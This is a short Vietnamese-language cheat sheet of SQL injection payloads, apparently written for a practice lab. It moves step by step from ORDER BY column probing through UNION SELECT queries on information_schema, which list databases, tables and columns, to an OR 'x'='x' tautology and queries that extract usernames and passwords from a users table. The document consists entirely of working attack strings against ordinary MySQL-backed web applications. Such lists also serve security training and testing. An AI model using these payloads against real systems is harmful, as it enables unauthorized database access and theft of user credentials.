### Xác định vị trí lỗi
```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- - <- injected
1' ORDER BY 3-- - // error
```
### Tìm vị trí cột hiển thị

``` sql
1' UNION ALL SELECT 1, @@version-- -
```

### Xem 2 cái cùng 1 lúc
``` sql
1' UNION select table_schema,table_name FROM information_schema.tables-- -
```
### Tìm tên database
``` sql
1' union select table_schema,2 from information_schema.tables-- -
-4553' UNION ALL SELECT NULL,NULL,JSON_ARRAYAGG(table_schema),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES-- -
```
#### Dùng thêm JSON_ARRAYAGG khi có nhiều giá trị trả về xem không hết

### Tìm tên tables

``` sql
1' union select table_name,2 from information_schema.tables-- -
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,JSON_ARRAYAGG(table_name),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6861636b696e67)-- -

```

### Xem tất cả dữ liệu trong bảng hiện tại 

``` sql
1' OR 'x'='x'-- -
```

### Tìm tên cấu trúc cột

``` sql
1' UNION select column_name FROM information_schema.columns-- -
1' UNION SELECT table_name, column_name FROM information_schema.columns-- -
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,JSON_ARRAYAGG(table_name, column_name),NULL FROM INFORMATION_SCHEMA.columns WHERE table_schema IN (0x6861636b696e67)-- -

```

### Xem dữ liệu bên trong

``` sql
1' union select * from users-- -
1' UNION SELECT user, password FROM users-- -
1' UNION ALL SELECT NULL,NULL,JSON_ARRAYAGG(CONCAT_WS('-',title,id)),NULL,NULL,NULL,NULL FROM hacking.product-- -
1' UNION ALL SELECT NULL,NULL,JSON_ARRAYAGG(CONCAT_WS('-',username,password)),NULL,NULL,NULL,NULL FROM hacking.users-- -
```
